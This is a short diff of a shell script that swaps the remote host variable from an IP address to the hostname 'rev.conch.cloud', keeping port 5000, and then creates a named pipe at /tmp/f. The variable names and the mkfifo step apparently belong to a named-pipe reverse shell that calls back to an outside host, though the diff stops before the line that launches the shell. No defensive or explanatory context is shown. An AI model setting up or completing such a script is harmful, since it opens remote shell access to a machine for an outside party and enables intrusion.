@@ -1,6 +1,6 @@
 #!/bin/sh
 
-RHOST="18.191.147.48"
+RHOST="rev.conch.cloud"
 RPORT="5000"
 
 mkfifo /tmp/f
